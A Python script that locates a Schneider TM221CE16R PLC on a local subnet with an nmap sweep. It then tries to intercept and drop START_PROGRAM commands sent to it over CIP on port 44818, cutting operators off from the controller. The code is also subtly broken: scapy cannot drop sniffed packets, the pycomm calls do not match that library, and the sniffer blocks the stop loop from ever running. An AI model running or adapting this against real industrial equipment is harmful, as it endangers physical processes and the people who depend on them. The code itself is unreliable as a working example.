import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def block_command_message(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the command message to block
        command_message = 'START_PROGRAM'
        
        # Use scapy to sniff and block the command message
        def block_message(packet):
            if packet.haslayer(CIP) and packet[CIP].command == command_message:
                packet.drop()
        
        # Start the sniffer
        sniff(filter='ip and port 44818', prn=block_message, store=False)
        
        print(f"Command message '{command_message}' blocked from reaching PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to block command message: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Block the command message from reaching the PLC
        block_command_message(plc_ip)
        
        while True:
            user_input = input("Type 'top' to stop blocking command message: ")
            if user_input.lower() == 'top':
                break
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()